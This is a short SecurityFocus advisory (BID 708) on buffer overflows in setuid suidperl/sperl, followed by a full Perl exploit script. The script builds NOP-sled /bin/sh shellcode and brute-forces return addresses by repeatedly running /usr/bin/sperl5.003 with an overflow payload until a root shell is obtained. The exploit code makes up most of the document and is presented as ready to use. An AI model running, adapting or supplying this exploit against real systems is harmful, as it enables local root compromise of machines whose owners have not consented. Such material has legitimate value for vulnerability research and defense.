source: http://www.securityfocus.com/bid/708/info

Several buffer overflows were found in the Perl helper application 'suidperl' or 'sperl'. When this program is installed setuid root the overflows may lead to a local root compromise. 

 #!/usr/bin/perl

 # yes, this suidperl exploit is in perl, isn't it wonderful? :)

 $| = 1;

 $shellcode =
 "\x90" x 512 . # nops
 "\xbc\xf0\xff\xff\xbf" . # movl $0xbffffff0,%esp
 # "standard shellcode" by Aleph One
 "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
 "\x80\xe8\xdc\xff\xff\xff/bin/sh";

 # start and end of .data
 # adjust this using /proc/*/maps

 $databot = 0x080a2000;
 $datatop = 0x080ab000;

 # trial and error loop

 $address = $databot + 4;

 while ($address < $datatop) {
 $smash_me =
 $shellcode . ('A' x (2052 - length($shellcode))) .
 (pack("l", $address) x 1000) . ('B' x 1000);
 $pid = fork();
 if (!$pid) {
 exec('/usr/bin/sperl5.003', $smash_me);
 }
 else {
 wait;
 if ($? == 0) {
 printf("THE MAGIC ADDRESS WAS %08x\n", $address);
 exit;
 }
 }
 $address += 128;
 }
